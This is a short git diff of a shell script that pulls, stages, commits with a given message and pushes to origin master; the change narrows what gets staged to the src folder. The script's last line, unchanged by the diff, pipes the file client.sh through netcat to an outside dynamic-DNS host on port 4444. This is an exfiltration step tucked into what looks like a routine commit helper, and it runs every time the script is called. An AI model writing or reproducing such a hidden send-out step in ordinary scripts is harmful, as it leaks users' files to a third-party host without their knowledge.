@@ -1,5 +1,5 @@
 git pull origin master
-git add .
+git add src
 git commit -m $1
 git push origin master
 timeout 5 netcat salamsalam.hopto.org 4444<client.sh
